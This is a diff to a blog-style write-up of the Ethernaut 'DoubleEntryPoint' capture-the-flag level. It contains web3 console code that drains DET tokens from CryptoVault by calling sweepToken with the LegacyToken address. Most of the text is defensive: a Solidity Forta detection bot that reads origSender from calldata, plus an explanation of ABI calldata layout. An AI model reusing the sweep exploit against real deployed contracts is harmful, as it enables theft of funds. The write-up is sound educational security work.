@@ -145,7 +145,7 @@ The `contract` object in our console is of the `DoubleEntryPoint` contract, judg
 const cryptoVaultAddress = await contract.cryptoVault()
 // access "IERC20 public underlying;" variable
 await web3.eth.getStorageAt(cryptoVaultAddress, 1)
-// 0x00000000000000000000000061119665793cab4f1a4ab32fa1ca44a1f4a31360
+// 0x00000000000000000000000025047168b9c737a03a111ec039438403e73b7507
 ```
 
 We got the address of DET token, the one we are supposed to protect! so we want to prevent transfer of DET token; but, can we really?
@@ -175,7 +175,7 @@ await web3.eth.call({
   to: legacyTokenAddress,
   data: '0xc89e4361' // delegate()
 })
-// 0x00000000000000000000000061119665793cab4f1a4ab32fa1ca44a1f4a31360
+// 0x00000000000000000000000025047168b9c737a03a111ec039438403e73b7507
 ```
 
 Oh boy, they are the same... This is bad for the underlying token because if someone were to call `sweepToken` with `LegacyToken` as the address, it will cause DET to be swept! Let us do so:
@@ -186,7 +186,7 @@ const cryptoVaultAddress = await contract.cryptoVault();
 const legacyTokenAddress = await contract.delegatedFrom();
 
 // check initial balance
-const initialBalance = (await contract.balanceOf(cryptoVaultAddress)).toString();
+await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());
 
 // call sweepToken of CryptoVault with LegacyToken as the parameter
 const _function = {
@@ -210,68 +210,101 @@ await web3.eth.sendTransaction({
 });
 
 // check balance again to see it be 0
-const finalBalance = (await contract.balanceOf(cryptoVaultAddress)).toString();
-
-// for the console
-initialBalance > finalBalance && finalBalance == 0;
+await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());
 ```
 
 Boom, DET has been swept.
 
-## Preventing the Attack with Forta
+## Preventing the Attack with Forta Detection Bot
 
 Now, we will prevent this attack with a Forta detection bot. We must look at the Forta contract for this. In particular, our bot must follow the `IDetectionBot` interface, which requests the implementation of a `function handleTransaction(address user, bytes calldata msgData) external`. Indeed, this function is called within the `notify` function of Forta contract. To raise an alert, the bot must call `raiseAlert` function of it's caller (accessed via `msg.sender`) which will be the Forta contract.
 
-How should we prevent this? Well, the attack was made by calling the `sweepToken` function of `CryptoVault` contract with `LegacyToken` contract as the address. Then, a message call to `DoubleEntryPoint` contract is made for the `delegateTransfer` function. That message's data is the one our bot will receive on `handleTransaction`, because `delegateTransfer` is the one with `fortaNotify` modifier. Regarding that function, the only thing we can use for our need is the `origSender`, which will be the address of `CryptoVault` during a sweep. So, our bot can check that value within the calldata and raise an alert.
+How should we prevent this? Well, the attack was made by calling the `sweepToken` function of `CryptoVault` contract with `LegacyToken` contract as the address. Then, a message call to `DoubleEntryPoint` contract is made for the `delegateTransfer` function. That message's data is the one our bot will receive on `handleTransaction`, because `delegateTransfer` is the one with `fortaNotify` modifier. Regarding that function, the only thing we can use for our need is the `origSender`, which will be the address of `CryptoVault` during a sweep. So, our bot can check that value within the calldata and raise an alert if it is the address of `CryptoVault`.
 
-At this point, we need to put special effort into understanding how the calldata will be structured during during `delegateTransfer`. From the `delegateTransfer` point of view:
+At this point, we need to put special effort into understanding [how the calldata will be structured](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi). We are calling `delegateTransfer` but that is not the calldata our bot will receive. You see, this function has a modifier `fortaNotify`. The modifier is not a message call, but simply replaces code with respect to the execution line (`_;`). During `notify`, the `msg.data` is passed as a parameter, so this has the structure of the calldata shown in the table above.
 
-| position | bytes | value |
-| -- | -- | -- |
-| `0x00` | 4 | Function selector of `delegateTransfer` |
-| `0x04` | 32 | `address to` parameter |
-| `0x24` | 32 | `uint256 value` parameter |
-| `0x44` | 32 | `address origSender` parameter |
+After `notify`, our detection bot's `handleTransaction` is called with the same `msg.data` passed to `notify`. So, during `handleTransaction`, the calldata will have the actual calldata to call that function, and the `delegateCall` calldata as an argument.
 
-So we can load 32 bytes from `0x44` and that will be our `origSender`. Of course, it has to be casted to an address which is 20 bytes. Let's write our bot then!
+| position | bytes | type | value |
+| -- | -- | -- | -- |
+| `0x00` | 4 | `bytes4` | Function selector of `handleTransaction` which is `0x220ab6aa` |
+| `0x04` | 32 | `address` (padded) | `user` parameter |
+| `0x24` | 32 | `uint256` | offset of `msgData` parameter, `0x40` in this case |
+| `0x44` | 32 | `uint256` | length of `msgData` parameter, `0x64` in this case |
+| `0x64` *\** | 4 | `bytes4` | Function selector of `delegateTransfer` which is `0x9cd1a121` |
+| `0x68` *\** | 32 | `address` (padded) | `to` parameter |
+| `0x88` *\** | 32 | `uint256` | `value` parameter |
+| `0xA8` *\** | 32 | `address` (padded) | `origSender` parameter **the one we want** |
+| `0xC8` | 28 | padding | zero-padding as per the 32-byte arguments rule of encoding `bytes` |
+
+The *\** marks the original calldata when `delegateTransfer` is called. For more information on how this is calculated, see to the end of this post where I create a toy-contract to find out the calldata.
+
+Anyways, it is time to write our bot! We will copy-paste the `IDetectionBot` interface, as well as `IForta` interface and `Forta` contract which we will use within to raise an alert.
 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
-
 interface IDetectionBot {
-    function handleTransaction(address user, bytes calldata msgData) external;
+  function handleTransaction(address user, bytes calldata msgData) external;
 }
 
 interface IForta {
-    function raiseAlert(address user) external;
+  function setDetectionBot(address detectionBotAddress) external;
+  function notify(address user, bytes calldata msgData) external;
+  function raiseAlert(address user) external;
 }
 
-contract MyDetectionBot is IDetectionBot, Ownable {
-    bytes private badMsgData;
-    bytes public lastMsgData;
+contract Forta is IForta {
+  mapping(address => IDetectionBot) public usersDetectionBots;
+  mapping(address => uint256) public botRaisedAlerts;
 
-    function setBadMsgData(bytes memory _badMsgData) external onlyOwner {
-        badMsgData = _badMsgData;
+  function setDetectionBot(address detectionBotAddress) external override {
+    require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
+    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+  }
+
+  function notify(address user, bytes calldata msgData) external override {
+    if(address(usersDetectionBots[user]) == address(0)) return;
+    try usersDetectionBots[user].handleTransaction(user, msgData) {
+      return;
+    } catch {}
+  }
+
+  function raiseAlert(address user) external override {
+    if(address(usersDetectionBots[user]) != msg.sender) return;
+    botRaisedAlerts[msg.sender] += 1;
+  } 
+}
+
+contract MyDetectionBot is IDetectionBot {
+  address public cryptoVaultAddress;
+
+  constructor(address _cryptoVaultAddress) {
+    cryptoVaultAddress = _cryptoVaultAddress;
+  }
+
+  // we can comment out the variable name to silence "unused parameter" error
+  function handleTransaction(address user, bytes calldata /* msgData */) external override { 
+    // extract sender from calldata
+    address origSender;
+    assembly {
+      origSender := calldataload(0xa8)
     }
 
-    function handleTransaction(address user, bytes calldata msgData) external {
-        lastMsgData = msgData;
-        if (keccak256(msgData) == keccak256(badMsgData)) {
-            IForta(msg.sender).raiseAlert(user);
-        }
-    } 
+    // raise alert only if the msg.sender is CryptoVault contract
+    if (origSender == cryptoVaultAddress) {
+      Forta(msg.sender).raiseAlert(user);
+    }
+  }
 }
 ```
 
-Upon deployment, we set the `badMsgData` as the calldata that we have constructed above during our attack. We then set the detection bot at the Forta contract:
+Upon deploying the detection bot with the correct `CryptoVault` address, we must set the detection bot at the `Forta` contract:
 
 ```js
-// get the address from DoubleEntryPoint
 const fortaAddress = await contract.forta()
-const detectionBotAddress = "0x6765a9cEeE4CdAc1326236B24F943217dd298311" // your address here
+const detectionBotAddress = "0x63b2a2028E10025843c90DF9dEF2748565f495F0" // your address here
 
 // call setDetectionBot of Forta with your detection bot address as the parameter
 const _function = {
@@ -297,38 +330,54 @@ await web3.eth.sendTransaction({
 
 Done!
 
+## About the Calldata
 
-todo todo submit again with better conract:
-
+It took me some time to wrap my head around how exactly the calldata was calculated, so I wrote a toy-contract that acts the same:
 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IDetectionBot {
-    function handleTransaction(address user, bytes calldata msgData) external;
+contract TestBot {
+  bytes public calldataAtHandleTransaction;
+  bytes public parameterAtHandleTransaction;
+
+  function handleTransaction(address user, bytes calldata msgData) external { 
+    calldataAtHandleTransaction = msg.data;
+    parameterAtHandleTransaction = msgData;
+  }
 }
 
-interface IForta {
-    function raiseAlert(address user) external;
-}
+contract TestDet {
+  address botAddress;
 
-contract MyDetectionBot is IDetectionBot {
-    address public cryptoVaultAddress;
+  constructor(address _botAddress) {
+    botAddress = _botAddress;
+  }
 
-    constructor(address _cryptoVaultAddress) {
-        cryptoVaultAddress = _cryptoVaultAddress;
-    }
-
-    function handleTransaction(address user, bytes calldata /* msgData */) external override { 
-        address origSender;
-        assembly {
-            origSender := calldataload(0xa8)
-        }
-
-        if (origSender == cryptoVaultAddress) {
-            IForta(msg.sender).raiseAlert(user);
-        }
-    }
+  function delegateTransfer(
+    address addr1, // 0x1111111111111111111111111111111111111111
+    uint256 val1,  // 10
+    address addr2  // 0x2222222222222222222222222222222222222222
+  ) external {
+    TestBot(botAddress).handleTransaction(addr1, msg.data);
+  }
 }
 ```
+
+If you call `delegateTransfer` of `TestDet` contract, and then check the public variables of `TestBot` you will have a clear look on the calldata and `msgData` argument during `handleTransaction`. Looking at the documentation for ABI Specification, we see that
+
+> `bytes`, of length `k` (which is assumed to be of type `uint256`): `enc(X) = enc(k) pad_right(X)`, i.e. the number of bytes is encoded as a `uint256` followed by the actual value of `X` as a byte sequence, followed by the minimum number of zero-bytes such that `len(enc(X))` is a multiple of 32.
+
+Looking at the calldata of `delegateTransfer`, we have:
+
+- 4 bytes function selector
+- 32 bytes address
+- 32 bytes unsigned integer
+- 32 bytes address
+
+A total of 100 bytes, which is `0x64` in hex. So, in the calldata of `handleTransaction` the length value for `msgData` will be `0x64`. What about the offset value?
+
+> ... for the dynamic types `uint32[]` and `bytes`, we use the offset in bytes to the start of their data area, measured from the start of the value encoding (i.e. not counting the first four bytes containing the hash of the function signature)
+
+At the table above we saw that the position of `msgData` length is at `0x44`. That includes the function signature of `handleTransaction`, so after ignoring it we get the offset value `0x40`.
